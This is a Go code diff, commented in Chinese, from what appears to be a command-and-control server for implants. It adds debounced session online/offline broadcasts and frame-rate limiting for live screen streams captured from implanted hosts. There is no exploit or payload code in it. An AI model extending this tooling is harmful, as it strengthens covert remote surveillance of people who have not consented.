@@ -117,6 +117,14 @@ type Server struct {
 	// onConfigApplied 配置保存并热应用后的回调（由服务器主循环注册，
 	// 用于通知各组件如 HTTP listener 拟态模板切换）。
 	onConfigApplied func(cfg *config.Config)
+
+	// 会话上下线广播去抖状态（见 session_broadcast.go，P0-1）
+	broadcastState *sessionBroadcastState
+	broadcastOnce  sync.Once
+
+	// 屏幕流帧限速/合并状态（见 screen_frame_limiter.go，P0.2）
+	screenLimiter     *screenFrameLimiter
+	screenLimiterOnce sync.Once
 }
 
 // SetOnConfigApplied 注册配置热应用回调（设置 API 保存后触发）。
@@ -256,37 +264,17 @@ func sessionOnlinePayload(info *types.SessionInfo) map[string]interface{} {
 	}
 }
 
-// BroadcastSessionOnline 广播 session_online 事件（新会话上线/恢复在线）。
-// 所有监听器类型（TCP/HTTP/WS/MQTT/relay）的新会话注册都走这里，
-// 前端 Sessions 页据此即时插入/点亮行，不依赖轮询。
-func (s *Server) BroadcastSessionOnline(info *types.SessionInfo) {
-	if s.wsHub == nil || info == nil {
-		return
-	}
-	s.wsHub.Broadcast(WSEvent{
-		Type:    "session_online",
-		Payload: sessionOnlinePayload(info),
-	})
-}
-
-// BroadcastSessionOffline 广播 session_offline 事件（会话判定死亡）。
-func (s *Server) BroadcastSessionOffline(sessionID string) {
-	if s.wsHub == nil || sessionID == "" {
-		return
-	}
-	s.wsHub.Broadcast(WSEvent{
-		Type: "session_offline",
-		Payload: map[string]interface{}{
-			"id":     sessionID,
-			"status": "dead",
-		},
-	})
-}
+// 会话上下线广播（含去抖）见 session_broadcast.go：
+// BroadcastSessionOnline / BroadcastSessionOffline / ForgetSessionBroadcast。
 
 // BroadcastScreenFrame broadcasts a real-time screen stream frame to all WebSocket clients.
 // payload 是植入端截图 JSON（{image, format, width, height}），附加 session_id 后透传。
+// 超过会话期望帧率的帧在此丢弃（帧合并），避免 WS/前端被超发帧拖垮（P0.2）。
 func (s *Server) BroadcastScreenFrame(sessionID string, payload []byte) {
 	if s.wsHub == nil {
+		return
+	}
+	if !s.frameLimiter().Allow(sessionID) {
 		return
 	}
 	var frame map[string]interface{}
